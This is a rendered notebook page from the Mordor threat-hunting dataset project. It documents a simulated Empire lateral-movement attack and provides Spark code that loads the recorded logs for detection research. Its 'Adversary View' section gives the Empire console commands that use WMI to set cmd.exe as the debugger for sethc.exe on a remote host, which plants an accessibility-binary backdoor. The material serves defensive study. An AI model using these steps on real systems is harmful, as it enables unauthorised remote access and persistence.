@@ -1,0 +1,307 @@
+---
+redirect_from:
+  - "/notebooks/small/windows/02-execution/sd-190518215622"
+interact_link: content/notebooks/small/windows/02_execution/SD-190518215622.ipynb
+kernel_name: 
+kernel_path: content/notebooks/small/windows/02_execution
+has_widgets: false
+title: |-
+  Empire Invoke WMI Debugger
+pagenum: 8
+prev_page:
+  url: /notebooks/small/windows/02_execution/SD-191027042312.html
+next_page:
+  url: /notebooks/small/windows/02_execution/SD-190518211456.html
+suffix: .ipynb
+search: exe false lateralmovement powershell empire invokewmidebugger debugger set binary execute windows sethc cmd vwthy name module listener true agent invoke wmi mordor c com description target run shire dataset system stager credid store targetbinary username command password simulation script remote machine computername tasked id raw githubusercontent master data info wmidebugger needsadmin opsecsafe language minlanguageversion background outputextension none authors harmjy uses options required value host s comma separated cleanup switch disable specified utilman osk narrator magnify domain regpath hklm software microsoft registry location network debug code last element key y metadata sd author roberto rodriguez cybrwardg creation date platform environment type
+
+comment: "***PROGRAMMATICALLY GENERATED, DO NOT EDIT. SEE ORIGINAL FILES IN /content***"
+---
+
+    <main class="jupyter-page">
+    <div id="page-info"><div id="page-title">Empire Invoke WMI Debugger</div>
+</div>
+    <div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Metadata">Metadata<a class="anchor-link" href="#Metadata"> </a></h2>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<table>
+<thead><tr>
+<th style="text-align:left"></th>
+<th style="text-align:left"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">id</td>
+<td style="text-align:left">SD-190518215622</td>
+</tr>
+<tr>
+<td style="text-align:left">author</td>
+<td style="text-align:left">Roberto Rodriguez @Cyb3rWard0g</td>
+</tr>
+<tr>
+<td style="text-align:left">creation date</td>
+<td style="text-align:left">19/05/18</td>
+</tr>
+<tr>
+<td style="text-align:left">platform</td>
+<td style="text-align:left">Windows</td>
+</tr>
+<tr>
+<td style="text-align:left">Mordor Environment</td>
+<td style="text-align:left">shire</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Type</td>
+<td style="text-align:left">C2</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Tool</td>
+<td style="text-align:left">Empire</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Script</td>
+<td style="text-align:left"><a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1</a></td>
+</tr>
+<tr>
+<td style="text-align:left">Mordor Dataset</td>
+<td style="text-align:left"><a href="https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_wmi_debugger.tar.gz">https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_wmi_debugger.tar.gz</a></td>
+</tr>
+</tbody>
+</table>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Dataset-Description">Dataset Description<a class="anchor-link" href="#Dataset-Description"> </a></h2><p>This dataset represents adversaries using WMI to set the debugger for a target binary on a remote machine. Setting sethc.exe to be C:\Windows\System32\cmd.exe</p>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Adversary-View">Adversary View<a class="anchor-link" href="#Adversary-View"> </a></h2>
+<pre><code>(Empire: V6W3TH8Y) &gt; usemodule lateral_movement/invoke_wmi_debugger
+(Empire: powershell/lateral_movement/invoke_wmi_debugger) &gt; info
+
+              Name: Invoke-WMIDebugger
+            Module: powershell/lateral_movement/invoke_wmi_debugger
+        NeedsAdmin: False
+        OpsecSafe: False
+          Language: powershell
+MinLanguageVersion: 2
+        Background: False
+  OutputExtension: None
+
+Authors:
+  @harmj0y
+
+Description:
+  Uses WMI to set the debugger for a target binary on a remote
+  machine to be cmd.exe or a stager.
+
+Options:
+
+  Name         Required    Value                     Description
+  ----         --------    -------                   -----------
+  Listener     False                                 Listener to use.                        
+  CredID       False                                 CredID from the store to use.           
+  ComputerName True                                  Host[s] to execute the stager on, comma 
+                                                    separated.                              
+  Cleanup      False                                 Switch. Disable the debugger for the    
+                                                    specified TargetBinary.                 
+  TargetBinary True        sethc.exe                 Target binary to set the debugger for   
+                                                    (sethc.exe, Utilman.exe, osk.exe,       
+                                                    Narrator.exe, or Magnify.exe)           
+  UserName     False                                 [domain\]username to use to execute     
+                                                    command.                                
+  Binary       False       C:\Windows\System32\cmd.  Binary to set for the debugger.         
+                          exe                     
+  RegPath      False       HKLM:Software\Microsoft\  Registry location to store the script   
+                          Network\debug             code. Last element is the key name.     
+  Password     False                                 Password to use to execute command.     
+  Agent        True        V6W3TH8Y                  Agent to run module on.                 
+
+(Empire: powershell/lateral_movement/invoke_wmi_debugger) &gt; set Listener https
+(Empire: powershell/lateral_movement/invoke_wmi_debugger) &gt; set ComputerName IT001.shire.com
+(Empire: powershell/lateral_movement/invoke_wmi_debugger) &gt; set Listener ''
+(Empire: powershell/lateral_movement/invoke_wmi_debugger) &gt; info
+
+              Name: Invoke-WMIDebugger
+            Module: powershell/lateral_movement/invoke_wmi_debugger
+        NeedsAdmin: False
+        OpsecSafe: False
+          Language: powershell
+MinLanguageVersion: 2
+        Background: False
+  OutputExtension: None
+
+Authors:
+  @harmj0y
+
+Description:
+  Uses WMI to set the debugger for a target binary on a remote
+  machine to be cmd.exe or a stager.
+
+Options:
+
+  Name         Required    Value                     Description
+  ----         --------    -------                   -----------
+  Listener     False                                 Listener to use.                        
+  CredID       False                                 CredID from the store to use.           
+  ComputerName True        IT001.shire.com           Host[s] to execute the stager on, comma 
+                                                    separated.                              
+  Cleanup      False                                 Switch. Disable the debugger for the    
+                                                    specified TargetBinary.                 
+  TargetBinary True        sethc.exe                 Target binary to set the debugger for   
+                                                    (sethc.exe, Utilman.exe, osk.exe,       
+                                                    Narrator.exe, or Magnify.exe)           
+  UserName     False                                 [domain\]username to use to execute     
+                                                    command.                                
+  Binary       False       C:\Windows\System32\cmd.  Binary to set for the debugger.         
+                          exe                     
+  RegPath      False       HKLM:Software\Microsoft\  Registry location to store the script   
+                          Network\debug             code. Last element is the key name.     
+  Password     False                                 Password to use to execute command.     
+  Agent        True        V6W3TH8Y                  Agent to run module on.                 
+
+(Empire: powershell/lateral_movement/invoke_wmi_debugger) &gt; execute                                          
+[&gt;] Module is not opsec safe, run? [y/N] y
+[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
+[*] Agent V6W3TH8Y tasked with task ID 7
+[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_wmi_debugger
+(Empire: powershell/lateral_movement/invoke_wmi_debugger) &gt; Invoke-Wmi executed on "IT001.shire.com" to set the debugger for sethc.exe to be C:\Windows\System32\cmd.exe.
+
+(Empire: powershell/lateral_movement/invoke_wmi_debugger) &gt;</code></pre>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Explore-Mordor-Dataset">Explore Mordor Dataset<a class="anchor-link" href="#Explore-Mordor-Dataset"> </a></h2>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Initialize-Analytics-Engine">Initialize Analytics Engine<a class="anchor-link" href="#Initialize-Analytics-Engine"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">openhunt.mordorutils</span> <span class="k">import</span> <span class="o">*</span>
+<span class="n">spark</span> <span class="o">=</span> <span class="n">get_spark</span><span class="p">()</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Download-&amp;-Process-Mordor-File">Download &amp; Process Mordor File<a class="anchor-link" href="#Download-&amp;-Process-Mordor-File"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_wmi_debugger.tar.gz&quot;</span>
+<span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Get-to-know-your-data">Get to know your data<a class="anchor-link" href="#Get-to-know-your-data"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
+            <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">SELECT channel, COUNT(1)</span>
+<span class="sd">FROM mordorTable</span>
+<span class="sd">GROUPBY channel</span>
+<span class="sd">            &#39;&#39;&#39;</span><span class="p">)</span>
+<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
+        
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+ 
+
+
+    </main>
+    
